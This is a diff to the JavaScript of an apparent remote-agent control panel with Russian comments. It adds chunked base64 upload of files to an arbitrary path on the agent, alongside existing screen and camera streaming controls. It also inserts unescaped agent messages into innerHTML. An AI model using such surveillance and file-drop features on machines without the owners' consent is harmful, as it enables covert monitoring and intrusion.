@@ -259,6 +259,47 @@ function handleMessage(msg) {
         return;
     }
 
+    // Загрузка файла на агент — статус
+    if (t === 'file_upload_status') {
+        const uploadStatus = document.getElementById('file-upload-status');
+        if (p.status === 'done') {
+            uploadStatus.innerHTML = `<span style="color:#4caf50;">✅ ${p.message || 'Готово'}</span>`;
+            // Скрываем прогресс-бар
+            const bar = document.getElementById('file-upload-progress');
+            if (bar) bar.style.display = 'none';
+        } else if (p.status === 'error') {
+            uploadStatus.innerHTML = `<span style="color:#f44336;">❌ Ошибка: ${p.message}</span>`;
+            const bar = document.getElementById('file-upload-progress');
+            if (bar) bar.style.display = 'none';
+        } else if (p.status === 'ready') {
+            uploadStatus.innerHTML = `<span style="color:#ff9800;">📡 ${p.message}</span>`;
+        } else {
+            uploadStatus.textContent = p.message || JSON.stringify(p);
+        }
+        // Разблокируем кнопку
+        const btn = document.getElementById('btn-upload-file');
+        if (btn && (p.status === 'done' || p.status === 'error')) {
+            btn.disabled = false;
+            btn.textContent = '📤 Отправить';
+        }
+        return;
+    }
+
+    if (t === 'file_upload_progress') {
+        const bar = document.getElementById('file-upload-bar');
+        const barContainer = document.getElementById('file-upload-progress');
+        const uploadStatus = document.getElementById('file-upload-status');
+        if (barContainer) barContainer.style.display = 'block';
+        if (bar) {
+            bar.style.width = p.percent + '%';
+            bar.textContent = p.percent + '%';
+        }
+        if (uploadStatus) {
+            uploadStatus.textContent = `Отправлено: ${p.received} / ${p.total} чанков (${p.percent}%)`;
+        }
+        return;
+    }
+
     // Остальные — в manage output
     appendManage(t + ': ' + JSON.stringify(p));
 }
@@ -530,6 +571,123 @@ window.addEventListener('beforeunload', () => {
     if (screenStreamActive) sendCmd('screen_stop', {});
     if (camStreamActive) sendCmd('stream_stop', {});
 });
+
+// ===== Загрузка файла на агент =====
+const CHUNK_SIZE_B64 = 256 * 1024;  // 256 KB чанков в base64
+
+function formatFileSize(bytes) {
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+    return (bytes / (1024 * 1024)).toFixed(2) + ' MB';
+}
+
+function uploadFileToAgent() {
+    const fileInput = document.getElementById('file-upload-input');
+    const destInput = document.getElementById('file-upload-dest');
+    const statusEl = document.getElementById('file-upload-status');
+    const btn = document.getElementById('btn-upload-file');
+
+    if (!fileInput.files || fileInput.files.length === 0) {
+        statusEl.textContent = 'Выберите файл!';
+        return;
+    }
+
+    const file = fileInput.files[0];
+    const destPath = (destInput ? destInput.value.trim() : '') || '';
+    const fileName = file.name;
+
+    // Ограничение: 50 MB
+    if (file.size > 50 * 1024 * 1024) {
+        statusEl.innerHTML = '<span style="color:#f44336;">❌ Файл слишком большой (макс. 50 МБ)</span>';
+        return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = '⏳ Загрузка...';
+    statusEl.textContent = `Чтение файла: ${fileName} (${formatFileSize(file.size)})...`;
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        const arrayBuffer = e.target.result;
+        const uint8 = new Uint8Array(arrayBuffer);
+
+        // Кодируем в base64
+        let binary = '';
+        for (let i = 0; i < uint8.length; i++) {
+            binary += String.fromCharCode(uint8[i]);
+        }
+        const b64 = btoa(binary);
+
+        if (b64.length <= CHUNK_SIZE_B64) {
+            // Маленький файл — отправляем целиком
+            statusEl.textContent = `Отправка ${fileName}...`;
+            sendCmd('file_upload_single', {
+                filename: fileName,
+                dest_path: destPath,
+                data: b64,
+            });
+        } else {
+            // Большой файл — чанками
+            const totalChunks = Math.ceil(b64.length / CHUNK_SIZE_B64);
+            const fileId = 'upload_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+
+            statusEl.textContent = `Подготовка: ${totalChunks} чанков...`;
+
+            // 1. Отправляем file_upload_start
+            sendCmd('file_upload_start', {
+                file_id: fileId,
+                filename: fileName,
+                dest_path: destPath,
+                total_chunks: totalChunks,
+                total_size: file.size,
+            });
+
+            // 2. Отправляем чанки с небольшой задержкой чтобы не перегрузить WS
+            let chunkIndex = 0;
+            const progressBar = document.getElementById('file-upload-progress');
+            const bar = document.getElementById('file-upload-bar');
+            if (progressBar) progressBar.style.display = 'block';
+
+            function sendNextChunk() {
+                if (chunkIndex >= totalChunks) return;
+
+                const start = chunkIndex * CHUNK_SIZE_B64;
+                const end = Math.min(start + CHUNK_SIZE_B64, b64.length);
+                const chunkData = b64.slice(start, end);
+
+                sendCmd('file_upload_chunk', {
+                    file_id: fileId,
+                    index: chunkIndex,
+                    data: chunkData,
+                });
+
+                chunkIndex++;
+                const pct = Math.round(chunkIndex / totalChunks * 100);
+                if (bar) {
+                    bar.style.width = pct + '%';
+                    bar.textContent = pct + '%';
+                }
+                statusEl.textContent = `Отправка чанка ${chunkIndex} / ${totalChunks}...`;
+
+                if (chunkIndex < totalChunks) {
+                    // Задержка 20ms между чанками для стабильности
+                    setTimeout(sendNextChunk, 20);
+                }
+            }
+
+            // Начинаем через 100ms после start, чтобы агент успел инициализировать буфер
+            setTimeout(sendNextChunk, 100);
+        }
+    };
+
+    reader.onerror = function() {
+        statusEl.innerHTML = '<span style="color:#f44336;">❌ Ошибка чтения файла</span>';
+        btn.disabled = false;
+        btn.textContent = '📤 Отправить';
+    };
+
+    reader.readAsArrayBuffer(file);
+}
 
 // ===== Запуск =====
 connectWS();
